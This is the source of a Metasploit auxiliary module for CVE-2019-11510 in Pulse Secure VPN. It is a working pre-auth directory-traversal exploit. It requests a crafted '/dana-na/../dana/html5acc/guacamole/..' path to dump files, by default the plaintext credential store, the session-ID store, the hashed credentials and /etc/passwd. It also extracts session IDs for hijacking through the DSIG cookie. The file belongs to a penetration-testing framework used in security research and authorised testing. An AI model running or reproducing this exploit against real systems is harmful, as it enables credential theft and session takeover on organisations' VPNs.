##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'                => 'Pulse Secure VPN Arbitrary File Disclosure',
      'Description'         => %q{
        This module exploits a pre-auth directory traversal in the Pulse Secure
        VPN server to dump an arbitrary file. Dumped files are stored in loot.

        If the "Automatic" action is set, plaintext and hashed credentials, as
        well as session IDs, will be dumped. Valid sessions can be hijacked by
        setting the "DSIG" browser cookie to a valid session ID.

        For the "Manual" action, please specify a file to dump via the "FILE"
        option. /etc/passwd will be dumped by default. If the "PRINT" option is
        set, file contents will be printed to the screen, with any unprintable
        characters replaced by a period.

        Please see related module exploit/linux/http/pulse_secure_cmd_exec for
        a post-auth exploit that can leverage the results from this module.
      },
      'Author'              => [
        'Orange Tsai',    # Discovery (@orange_8361)
        'Meh Chang',      # Discovery (@mehqq_)
        'Alyssa Herrera', # PoC       (@Alyssa_Herrera_)
        'Justin Wagner',  # Module    (@0xDezzy)
        'wvu'             # Module
      ],
      'References'          => [
        ['CVE', '2019-11510'],
        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],
        ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],
        ['URL', 'https://hackerone.com/reports/591295']
      ],
      'DisclosureDate'      => '2019-04-24', # Public disclosure
      'License'             => MSF_LICENSE,
      'Actions'             => [
        ['Automatic', 'Description' => 'Dump creds and sessions'],
        ['Manual',    'Description' => 'Dump an arbitrary file (FILE option)']
      ],
      'DefaultAction'       => 'Automatic',
      'DefaultOptions'      => {
        'RPORT'             => 443,
        'SSL'               => true,
        'HttpClientTimeout' => 5 # This seems sane
      },
      'Notes'               => {
        'Stability'         => [CRASH_SAFE],
        'SideEffects'       => [IOC_IN_LOGS],
        'RelatedModules'    => ['exploit/linux/http/pulse_secure_cmd_exec']
      }
    ))

    register_options([
      OptString.new(
        'FILE',
        [
          true,
          'File to dump (manual mode only)',
          '/etc/passwd'
        ]
      ),
      OptBool.new(
        'PRINT',
        [
          false,
          'Print file contents (manual mode only)',
          true
        ]
      )
    ])
  end

  def the_chosen_one
    return datastore['FILE'], 'User-chosen file'
  end

  def run
    files =
      case action.name
      when 'Automatic'
        print_status('Running in automatic mode')

        # Order by most sensitive first
        [
          plaintext_creds,
          session_ids,
          hashed_creds
        ]
      when 'Manual'
        print_status('Running in manual mode')

        # /etc/passwd by default
        [the_chosen_one]
      end

    files.each do |path, info|
      print_status("Dumping #{path}")

      res = send_request_raw(
        'method'  => 'GET',
        'uri'     => dir_traversal(path),
        'partial' => true # Allow partial response due to timeout
      )

      unless res
        fail_with(Failure::Unreachable, "Could not dump #{path}")
      end

      handle_response(res, path, info)
    end
  end

  def handle_response(res, path, info)
    case res.code
    when 200
      case action.name
      when 'Automatic'
        # TODO: Parse plaintext and hashed creds
        if path == session_ids.first
          print_status('Parsing session IDs...')

          parse_sids(res.body).each do |sid|
            print_good("Session ID found: #{sid}")
          end
        end
      when 'Manual'
        printable = res.body.gsub(/[^[:print:][:space:]]/, '.')

        print_line(printable) if datastore['PRINT']
      end

      print_good(store_loot(
        self.name,                  # ltype
        'application/octet-stream', # ctype
        rhost,                      # host
        res.body,                   # data
        path,                       # filename
        info                        # info
      ))
    when 302
      fail_with(Failure::NotVulnerable, "Redirected to #{res.redirection}")
    when 400
      print_error("Invalid path #{path}")
    when 404
      print_error("#{path} not found")
    else
      print_error("I don't know what a #{res.code} code is")
    end
  end

  def dir_traversal(path)
    normalize_uri(
      '/dana-na/../dana/html5acc/guacamole/../../../../../..',
      "#{path}?/dana/html5acc/guacamole/" # Bypass query/vars_get
    )
  end

  def parse_sids(body)
    body.to_s.scan(/randomVal([[:xdigit:]]+)/).flatten.reverse
  end

  def plaintext_creds
    return '/data/runtime/mtmp/lmdb/dataa/data.mdb', 'Plaintext credentials'
  end

  def session_ids
    return '/data/runtime/mtmp/lmdb/randomVal/data.mdb', 'Session IDs'
  end

  def hashed_creds
    return '/data/runtime/mtmp/system', 'Hashed credentials'
  end

end
